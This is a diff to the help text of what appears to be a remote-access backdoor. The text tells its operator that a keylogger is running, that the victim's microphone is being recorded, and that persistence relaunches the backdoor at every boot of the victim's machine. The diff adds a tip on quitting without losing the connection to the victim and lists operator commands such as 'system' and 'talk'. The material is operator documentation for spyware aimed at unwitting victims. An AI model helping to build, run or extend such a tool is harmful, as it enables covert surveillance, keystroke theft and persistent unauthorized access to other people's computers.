@@ -1,7 +1,8 @@
 	Keylogger is active.You can go 'keylogger commands' to keylogger related commands.
-	Recording the victim's microphone(if you didn't cancel it from code.).You can go 'camera and sounds commands' to microphone and camera related commands.
+	Recording the victim's microphone(if you didn't cancel it.).You can go 'camera and sounds commands' to microphone and camera related commands.
 	Permanance is activated since it opened(If you didn't use 'remove_permanance' command).
-        This backdoor will run every time the victim's bootup.(If you want to deactive it,use the 'remove_permanance' command)	
+        This backdoor will run every time the victim's bootup.(If you want to deactive it,use the 'remove_permanance' command)
+	If you quit with 'CTRL+C' you can't connect until the victim's bootup.So,you should quit with 'exit' command to connect victim again. 
 
 	Functional commands :																	
 		  |
@@ -11,7 +12,7 @@
 
 	exit													clear
 	▲													▲
-	╰──▶ Disconnected and exiting program.									╰──▶ Cleans up the terminal.
+	╰──▶ Exiting program.(without disconnected.)							        ╰──▶ Cleans up the terminal.
 
 	system													talk
 	▲													▲
